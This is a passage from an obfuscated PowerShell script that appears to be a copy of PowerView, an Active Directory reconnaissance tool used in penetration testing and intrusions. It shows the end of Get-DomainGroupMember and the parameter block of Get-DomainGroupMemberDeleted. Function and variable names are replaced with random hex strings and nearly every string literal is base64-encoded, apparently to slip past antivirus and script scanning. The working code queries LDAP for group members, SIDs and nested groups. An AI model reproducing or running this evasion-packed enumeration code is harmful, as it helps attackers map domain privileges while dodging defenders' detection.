                    ${00ebeba22c4d49c1b6c6474f2d5f0b12} = ${d9df5fc678774e82bffed7271d02d4ca}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${39139b7f0de54e69a9780575558505cd} = $Domain
                    }
                    else {
                        if (${00ebeba22c4d49c1b6c6474f2d5f0b12}) {
                            ${39139b7f0de54e69a9780575558505cd} = ${00ebeba22c4d49c1b6c6474f2d5f0b12}.SubString(${00ebeba22c4d49c1b6c6474f2d5f0b12}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAATABEAEEAUAAgAG0AYQB0AGMAaABpAG4AZwAgAHIAdQBsAGUAIAB0AG8AIAByAGUAYwB1AHIAcwBlACAAbwBuACAAJwAkAHsAMAAwAGUAYgBlAGIAYQAyADIAYwA0AGQANAA5AGMAMQBiADYAYwA2ADQANwA0AGYAMgBkADUAZgAwAGIAMQAyAH0AJwAsACAAbwBuAGwAeQAgAHUAcwBlAHIAIABhAGMAYwBvAHUAbgB0AHMAIAB3AGkAbABsACAAYgBlACAAcgBlAHQAdQByAG4AZQBkAC4A')))
                    ${6dfca86fd3264c2999a087404e239e9e}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoAG0AZQBtAGIAZQByAG8AZgA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AMQA5ADQAMQA6AD0AJAB7ADAAMABlAGIAZQBiAGEAMgAyAGMANABkADQAOQBjADEAYgA2AGMANgA0ADcANABmADIAZAA1AGYAMABiADEAMgB9ACkAKQA=')))
                    ${6dfca86fd3264c2999a087404e239e9e}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA==')))))
                    ${805886bfe59f43f7b547a914109edc67} = ${6dfca86fd3264c2999a087404e239e9e}.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = ${afd7d337a750465cb1eadfa1f8ae176d}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA'))))
            }
            else {
                ${fb29aaa2f9c140909efae41cb42f1bef} = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    ${56aaa31f880a49e195bcf739ac331528} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQApAA==')))
                    }
                    elseif (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${7eef0517afe94597af8ab4be39a72451} = ${56aaa31f880a49e195bcf739ac331528}.SubString(${56aaa31f880a49e195bcf739ac331528}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADcAZQBlAGYAMAA1ADEANwBhAGYAZQA5ADQANQA5ADcAYQBmADgAYQBiADQAYgBlADMAOQBhADcAMgA0ADUAMQB9ACcAIABmAHIAbwBtACAAJwAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AJwA=')))
                            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${7eef0517afe94597af8ab4be39a72451}
                            ${6dfca86fd3264c2999a087404e239e9e} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                            if (-not ${6dfca86fd3264c2999a087404e239e9e}) {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsANwBlAGUAZgAwADUAMQA3AGEAZgBlADkANAA1ADkANwBhAGYAOABhAGIANABiAGUAMwA5AGEANwAyADQANQAxAH0AJwA=')))
                            }
                        }
                    }
                    elseif (${56aaa31f880a49e195bcf739ac331528} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                        ${a58a88389bba4f499974f2986992284e} = (([Guid]${56aaa31f880a49e195bcf739ac331528}).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AGEANQA4AGEAOAA4ADMAOAA5AGIAYgBhADQAZgA0ADkAOQA5ADcANABmADIAOQA4ADYAOQA5ADIAMgA4ADQAZQB9ACkA')))
                    }
                    elseif (${56aaa31f880a49e195bcf739ac331528}.Contains('\')) {
                        ${742ef5907a3c4a6fa08a69570e3b96f2} = ${56aaa31f880a49e195bcf739ac331528}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | a4ad8c5db2444528bab99963038ffd7c -d6f8ca3d1c994c23b84c147c1aa4c2c9 Canonical
                        if (${742ef5907a3c4a6fa08a69570e3b96f2}) {
                            ${4f012487c687470fbf918145202d0777} = ${742ef5907a3c4a6fa08a69570e3b96f2}.SubString(0, ${742ef5907a3c4a6fa08a69570e3b96f2}.IndexOf('/'))
                            ${14eb3c56654d4851b0c0e59e10d33e62} = ${56aaa31f880a49e195bcf739ac331528}.Split('\')[1]
                            ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAMQA0AGUAYgAzAGMANQA2ADYANQA0AGQANAA4ADUAMQBiADAAYwAwAGUANQA5AGUAMQAwAGQAMwAzAGUANgAyAH0AKQA=')))
                            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${4f012487c687470fbf918145202d0777}
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADQAZgAwADEAMgA0ADgANwBjADYAOAA3ADQANwAwAGYAYgBmADkAMQA4ADEANAA1ADIAMAAyAGQAMAA3ADcANwB9ACcAIABmAHIAbwBtACAAJwAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AJwA=')))
                            ${6dfca86fd3264c2999a087404e239e9e} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                        }
                    }
                    else {
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                    }
                }
                if (${fb29aaa2f9c140909efae41cb42f1bef} -and (${fb29aaa2f9c140909efae41cb42f1bef}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBmAGIAMgA5AGEAYQBhADIAZgA5AGMAMQA0ADAAOQAwADkAZQBmAGEAZQA0ADEAYwBiADQAMgBmADEAYgBlAGYAfQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${6dfca86fd3264c2999a087404e239e9e}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $(${6dfca86fd3264c2999a087404e239e9e}.filter)"
                try {
                    ${186e3848daf342ca8207aeecd0de4352} = ${6dfca86fd3264c2999a087404e239e9e}.FindOne()
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAcwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHcAaQB0AGgAIABpAGQAZQBuAHQAaQB0AHkAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAOgAgACQAXwA=')))
                    ${805886bfe59f43f7b547a914109edc67} = @()
                }
                ${9fd551e465ec49029d638ba1be55331b} = ''
                ${00ebeba22c4d49c1b6c6474f2d5f0b12} = ''
                if (${186e3848daf342ca8207aeecd0de4352}) {
                    ${805886bfe59f43f7b547a914109edc67} = ${186e3848daf342ca8207aeecd0de4352}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA'))))
                    if (${805886bfe59f43f7b547a914109edc67}.count -eq 0) {
                        ${2cecaf2f570042d289151833d6b85be7} = $False
                        ${55c2c8dc9bd043e1ac2b3f4d6194c357} = 0
                        ${fc28f2798ff2424e8ed21998df4325d4} = 0
                        while (-not ${2cecaf2f570042d289151833d6b85be7}) {
                            ${fc28f2798ff2424e8ed21998df4325d4} = ${55c2c8dc9bd043e1ac2b3f4d6194c357} + 1499
                            ${9b88c3b8bb8848bb8833cbd912d0ff55}=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAkAHsANQA1AGMAMgBjADgAZABjADkAYgBkADAANAAzAGUAMQBhAGMAMgBiADMAZgA0AGQANgAxADkANABjADMANQA3AH0ALQAkAHsAZgBjADIAOABmADIANwA5ADgAZgBmADIANAAyADQAZQA4AGUAZAAyADEAOQA5ADgAZABmADQAMwAyADUAZAA0AH0A')))
                            ${55c2c8dc9bd043e1ac2b3f4d6194c357} += 1500
                            $Null = ${6dfca86fd3264c2999a087404e239e9e}.PropertiesToLoad.Clear()
                            $Null = ${6dfca86fd3264c2999a087404e239e9e}.PropertiesToLoad.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADkAYgA4ADgAYwAzAGIAOABiAGIAOAA4ADQAOABiAGIAOAA4ADMAMwBjAGIAZAA5ADEAMgBkADAAZgBmADUANQB9AA=='))))
                            $Null = ${6dfca86fd3264c2999a087404e239e9e}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))
                            $Null = ${6dfca86fd3264c2999a087404e239e9e}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))
                            try {
                                ${186e3848daf342ca8207aeecd0de4352} = ${6dfca86fd3264c2999a087404e239e9e}.FindOne()
                                ${b119e0c34c1845babced4fb90daa57b6} = ${186e3848daf342ca8207aeecd0de4352}.Properties.PropertyNames -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAqAA==')))
                                ${805886bfe59f43f7b547a914109edc67} += ${186e3848daf342ca8207aeecd0de4352}.Properties.item(${b119e0c34c1845babced4fb90daa57b6})
                                ${9fd551e465ec49029d638ba1be55331b} = ${186e3848daf342ca8207aeecd0de4352}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                                ${00ebeba22c4d49c1b6c6474f2d5f0b12} = ${186e3848daf342ca8207aeecd0de4352}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                                if (${805886bfe59f43f7b547a914109edc67}.count -eq 0) {
                                    ${2cecaf2f570042d289151833d6b85be7} = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${2cecaf2f570042d289151833d6b85be7} = $True
                            }
                        }
                    }
                    else {
                        ${9fd551e465ec49029d638ba1be55331b} = ${186e3848daf342ca8207aeecd0de4352}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                        ${00ebeba22c4d49c1b6c6474f2d5f0b12} = ${186e3848daf342ca8207aeecd0de4352}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                        ${805886bfe59f43f7b547a914109edc67} += ${186e3848daf342ca8207aeecd0de4352}.Properties.item(${b119e0c34c1845babced4fb90daa57b6})
                    }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${39139b7f0de54e69a9780575558505cd} = $Domain
                    }
                    else {
                        if (${00ebeba22c4d49c1b6c6474f2d5f0b12}) {
                            ${39139b7f0de54e69a9780575558505cd} = ${00ebeba22c4d49c1b6c6474f2d5f0b12}.SubString(${00ebeba22c4d49c1b6c6474f2d5f0b12}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                }
            }
            ForEach (${20ebd067c548454fa60a45c352c7aeb5} in ${805886bfe59f43f7b547a914109edc67}) {
                if (${ae30d9d9023e4b5d9acb4a043f389cdd} -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    ${26d3a3ae11e14d75a68b54a6ec5958fa} = ${afd7d337a750465cb1eadfa1f8ae176d}.Clone()
                    ${26d3a3ae11e14d75a68b54a6ec5958fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${20ebd067c548454fa60a45c352c7aeb5}
                    ${26d3a3ae11e14d75a68b54a6ec5958fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                    ${26d3a3ae11e14d75a68b54a6ec5958fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAYwBuACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQALABvAGIAagBlAGMAdABjAGwAYQBzAHMA')))
                    $Object = dc2f41a670d5455b8f64f106e1b09449 @26d3a3ae11e14d75a68b54a6ec5958fa
                    $Properties = $Object.Properties
                }
                if ($Properties) {
                    ${ac9316b8e23e477d94585bafbe4b3e5d} = New-Object PSObject
                    ${ac9316b8e23e477d94585bafbe4b3e5d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${39139b7f0de54e69a9780575558505cd}
                    ${ac9316b8e23e477d94585bafbe4b3e5d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${9fd551e465ec49029d638ba1be55331b}
                    ${ac9316b8e23e477d94585bafbe4b3e5d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${00ebeba22c4d49c1b6c6474f2d5f0b12}
                    if ($Properties.objectsid) {
                        ${52172c4c574547dfbd2909f13db04aa8} = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        ${52172c4c574547dfbd2909f13db04aa8} = $Null
                    }
                    try {
                        ${aec858a625904cf9aa9ea8553fa6915c} = $Properties.distinguishedname[0]
                        if (${aec858a625904cf9aa9ea8553fa6915c} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBpAGcAbgBTAGUAYwB1AHIAaQB0AHkAUAByAGkAbgBjAGkAcABhAGwAcwB8AFMALQAxAC0ANQAtADIAMQA=')))) {
                            try {
                                if (-not ${52172c4c574547dfbd2909f13db04aa8}) {
                                    ${52172c4c574547dfbd2909f13db04aa8} = $Properties.cn[0]
                                }
                                ${e18042d8b7f24bd59ecd166668ace597} = a4ad8c5db2444528bab99963038ffd7c -Identity ${52172c4c574547dfbd2909f13db04aa8} -d6f8ca3d1c994c23b84c147c1aa4c2c9 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA'))) @b36bf00903c14682a2e243a875596f28
                                if (${e18042d8b7f24bd59ecd166668ace597}) {
                                    ${f25fc84ed5b248fc9ecac12cdfc415db} = ${e18042d8b7f24bd59ecd166668ace597}.Split('@')[1]
                                }
                                else {
                                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewBhAGUAYwA4ADUAOABhADYAMgA1ADkAMAA0AGMAZgA5AGEAYQA5AGUAYQA4ADUANQAzAGYAYQA2ADkAMQA1AGMAfQA=')))
                                    ${f25fc84ed5b248fc9ecac12cdfc415db} = $Null
                                }
                            }
                            catch {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewBhAGUAYwA4ADUAOABhADYAMgA1ADkAMAA0AGMAZgA5AGEAYQA5AGUAYQA4ADUANQAzAGYAYQA2ADkAMQA1AGMAfQA=')))
                                ${f25fc84ed5b248fc9ecac12cdfc415db} = $Null
                            }
                        }
                        else {
                            ${f25fc84ed5b248fc9ecac12cdfc415db} = ${aec858a625904cf9aa9ea8553fa6915c}.SubString(${aec858a625904cf9aa9ea8553fa6915c}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                    catch {
                        ${aec858a625904cf9aa9ea8553fa6915c} = $Null
                        ${f25fc84ed5b248fc9ecac12cdfc415db} = $Null
                    }
                    if ($Properties.samaccountname) {
                        ${4db284038e1e4b3ebf207b4b614fe75c} = $Properties.samaccountname[0]
                    }
                    else {
                        try {
                            ${4db284038e1e4b3ebf207b4b614fe75c} = e867aff561cb4dacb74c955fc46aa9c1 -23ca6558fa4b4ce695fc6d89d0b892e5 $Properties.cn[0] @b36bf00903c14682a2e243a875596f28
                        }
                        catch {
                            ${4db284038e1e4b3ebf207b4b614fe75c} = $Properties.cn[0]
                        }
                    }
                    if ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))) {
                        ${62ae92f6f4834fecbc2ac5f6de45caa9} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))
                    }
                    elseif ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))) {
                        ${62ae92f6f4834fecbc2ac5f6de45caa9} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                    }
                    elseif ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))) {
                        ${62ae92f6f4834fecbc2ac5f6de45caa9} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                    }
                    else {
                        ${62ae92f6f4834fecbc2ac5f6de45caa9} = $Null
                    }
                    ${ac9316b8e23e477d94585bafbe4b3e5d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${f25fc84ed5b248fc9ecac12cdfc415db}
                    ${ac9316b8e23e477d94585bafbe4b3e5d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${4db284038e1e4b3ebf207b4b614fe75c}
                    ${ac9316b8e23e477d94585bafbe4b3e5d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${aec858a625904cf9aa9ea8553fa6915c}
                    ${ac9316b8e23e477d94585bafbe4b3e5d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATwBiAGoAZQBjAHQAQwBsAGEAcwBzAA=='))) ${62ae92f6f4834fecbc2ac5f6de45caa9}
                    ${ac9316b8e23e477d94585bafbe4b3e5d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAUwBJAEQA'))) ${52172c4c574547dfbd2909f13db04aa8}
                    ${ac9316b8e23e477d94585bafbe4b3e5d}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAATQBlAG0AYgBlAHIA'))))
                    ${ac9316b8e23e477d94585bafbe4b3e5d}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQA=')))] -and ${aec858a625904cf9aa9ea8553fa6915c} -and (${62ae92f6f4834fecbc2ac5f6de45caa9} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAATQBhAG4AdQBhAGwAbAB5ACAAcgBlAGMAdQByAHMAaQBuAGcAIABvAG4AIABnAHIAbwB1AHAAOgAgACQAewBhAGUAYwA4ADUAOABhADYAMgA1ADkAMAA0AGMAZgA5AGEAYQA5AGUAYQA4ADUANQAzAGYAYQA2ADkAMQA1AGMAfQA=')))
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${aec858a625904cf9aa9ea8553fa6915c}
                        $Null = ${afd7d337a750465cb1eadfa1f8ae176d}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                        d5ea7ec938ad4aeeacb8bc5e972e183f @afd7d337a750465cb1eadfa1f8ae176d
                    }
                }
            }
            ${6dfca86fd3264c2999a087404e239e9e}.dispose()
        }
    }
}
function Get-DomainGroupMemberDeleted {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{
